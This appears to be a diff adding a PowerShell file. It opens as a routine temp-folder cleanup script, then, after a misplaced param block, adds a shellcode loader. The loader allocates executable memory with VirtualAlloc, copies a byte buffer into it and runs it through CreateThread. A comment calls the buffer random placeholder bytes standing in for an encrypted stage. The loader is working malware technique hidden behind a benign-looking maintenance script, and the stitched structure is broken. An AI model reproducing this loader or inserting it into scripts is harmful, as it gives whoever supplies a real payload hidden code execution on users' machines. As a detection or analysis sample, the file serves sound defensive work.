@@ -1,0 +1,121 @@
+
+$ErrorActionPreference = "Stop"
+$TempRoot = $env:TEMP
+$AgeDays = 3
+$MinSizeMB = 2
+$LogPath = "C:\Logs\temp-cleanup-2024-05-13.log"
+$DryRun = $false
+
+$DebugPreference = 'SilentlyContinue'
+
+if (-not (Test-Path -LiteralPath $TempRoot)) {
+    throw ("Temp path not found: {0}" -f $TempRoot)
+}
+$cutoff = (Get-Date).AddDays(-$AgeDays)
+$allFiles = @(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue)
+$beforeMB = [math]::Round((($allFiles | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+$stale = $allFiles | Where-Object {
+    $_.LastWriteTime -lt $cutoff -and $_.Length -ge ($MinSizeMB * 1MB)
+}
+$reclaimMB = [math]::Round((($stale | Measure-Object -Property Length -Sum).Sum) / 1MB, 1)
+
+Write-Host ("Before: {0} MB | Reclaimable: {1} MB across {2} files" -f $beforeMB, $reclaimMB, @($stale).Count) -ForegroundColor Cyan
+foreach ($file in $stale) {
+    if (-not $file.FullName.StartsWith($TempRoot, [System.StringComparison]::OrdinalIgnoreCase)) {
+        continue
+    }
+    Remove-Item -LiteralPath $file.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+}
+$remainingMB = [math]::Round((@(Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -File -ErrorAction SilentlyContinue) |
+    Measure-Object -Property Length -Sum).Sum / 1MB, 1)
+
+Write-Host ("After cleanup: {0} MB" -f $remainingMB) -ForegroundColor Green
+$line = "{0} reclaimed {1} MB from {2} files" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $reclaimMB, @($stale).Count
+Add-Content -Path $LogPath -Value $line -Encoding UTF8
+
+$emptyDirs = Get-ChildItem -LiteralPath $TempRoot -Recurse -Force -Directory -ErrorAction SilentlyContinue |
+    Where-Object { @(Get-ChildItem -LiteralPath $_.FullName -Force -ErrorAction SilentlyContinue).Count -eq 0 }
+foreach ($dir in $emptyDirs) {
+    if ($dir.LastWriteTime -lt $cutoff) {
+        Remove-Item -LiteralPath $dir.FullName -Force -WhatIf:$DryRun -ErrorAction SilentlyContinue
+    }
+}
+
+$psVersion = $PSVersionTable.PSVersion
+Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
+Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
+
+$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
+Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+$NativeCode = @"
+using System;
+using System.Runtime.InteropServices;
+
+public static class Win32Api
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+        uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+        uint dwFreeType);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+}
+"@
+
+Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+# buffer placeholder: random bytes, replaces the encrypted stage in real samples
+$Buffer = [Byte[]] @(
+    0xa5, 0x68, 0x31, 0x3e, 0xca, 0x0b, 0x18, 0x2d, 0xcf, 0x30, 0xfa, 0x2d, 0xb0, 0x08, 0x76, 0x7f,
+    0x05, 0x3b, 0xe0, 0x2a, 0x4b, 0xeb, 0xec, 0x92, 0x4c, 0x97, 0xa4, 0xbb, 0x97, 0x75, 0xc8, 0xce,
+    0xd9, 0x20, 0xd7, 0xe2, 0xc5, 0xbc, 0x44, 0xb7, 0x0c, 0x88, 0xd0, 0x34, 0xde, 0x3a, 0xff, 0x37,
+    0x44, 0x24, 0x14, 0x91, 0x23, 0xa3, 0xe0, 0x5e, 0x2c, 0x7e, 0x59, 0x72, 0x87, 0x11, 0xfd, 0x3f,
+    0xcb, 0x24, 0x2f, 0xf6, 0xf3, 0xb6, 0x51, 0xfe, 0x8e, 0x3e, 0x88, 0xc2, 0x02, 0x2d, 0x40, 0x64,
+    0x81, 0x94, 0x17, 0x03, 0x10, 0x6f, 0x0e, 0x60, 0x1f, 0x30, 0x7a, 0x3d, 0xe0, 0xf6, 0x0c, 0x5d,
+    0x3e, 0xd3, 0x0b, 0xbb, 0x3c, 0x5a, 0xc6, 0xb3, 0xe4, 0xee, 0xd7, 0xb2, 0x2d, 0x54, 0x8f, 0x1f,
+    0x07, 0xf3, 0x1a, 0x9b, 0xe6, 0xf0, 0x8e, 0x99, 0x1c, 0x29, 0x8b, 0xa5, 0xbf, 0xc0, 0xe4, 0x52,
+    0x7c, 0x1a, 0x04, 0xd2, 0x33, 0x68, 0x5e, 0xb6, 0x7b, 0x37, 0xb9, 0x4a, 0x26, 0x11, 0x55, 0xf3,
+    0xa2, 0x4a, 0x97, 0x63, 0xaa, 0xcc, 0x22, 0x9a, 0x93, 0x23, 0x5d, 0x83, 0xd8, 0x5b, 0xa0, 0x21,
+    0xd3, 0xa6, 0xe6, 0xae, 0xcc, 0x79, 0x6e, 0x09, 0x31, 0x15, 0x7a, 0xf1, 0xf5, 0x64, 0x4b, 0xf5,
+    0x5e, 0x08, 0xb9, 0x08, 0x75, 0xec, 0xdd, 0x66, 0xac, 0xdd, 0xf5, 0x4e, 0xb5, 0xf6, 0xfe, 0xf9,
+    0x6a, 0x13, 0xf7, 0x80, 0xb2, 0xea, 0xe1, 0x67, 0x61, 0xa7, 0x0f, 0x01, 0xba, 0x64, 0x5c, 0x95,
+    0x45, 0xa0, 0x5e, 0xc4, 0x90, 0xca, 0x41, 0x90, 0xfa, 0x39, 0xe0, 0x6e, 0x5b, 0xea, 0x9d, 0x8b,
+    0x58, 0x84, 0x39, 0x2c, 0x4e, 0xf4, 0x38, 0x6d, 0xe9, 0xbb, 0xda, 0x3e, 0x4d, 0x95, 0xfa, 0x1e,
+    0xbc, 0x1d, 0x87, 0xcd, 0xc3, 0x61, 0x2a, 0xee, 0x0e, 0x4d, 0x48, 0x52, 0xeb, 0x63, 0xd0, 0x0b,
+    0xc3, 0xc9, 0x73, 0x6c, 0x6b, 0x5b, 0x81, 0x62, 0xee, 0xd3, 0xfe, 0x11, 0x03, 0xac, 0x4b, 0x3e,
+    0x25, 0xfa, 0x15, 0x47, 0xd3, 0x02, 0xab, 0xb2, 0xbc, 0x26, 0xf5, 0xa4, 0x09, 0x5a, 0xb8, 0x45,
+    0xbc, 0x89, 0xa5, 0x13, 0x8a, 0xe8, 0xe1, 0xd0, 0x5c, 0xba, 0x45, 0xed, 0x35, 0x97, 0x12, 0x25
+)
+
+$ProcHandle = [Win32Api]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+if ($ProcHandle -eq [IntPtr]::Zero) {
+    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+    return
+}
+
+[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $ProcHandle, $Buffer.Length)
+$ThreadId = 0
+$Thread = [Win32Api]::CreateThread([IntPtr]::Zero, 0, $ProcHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+[void][Win32Api]::WaitForSingleObject($Thread, 1472)
+[void][Win32Api]::CloseHandle($Thread)
+
+$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
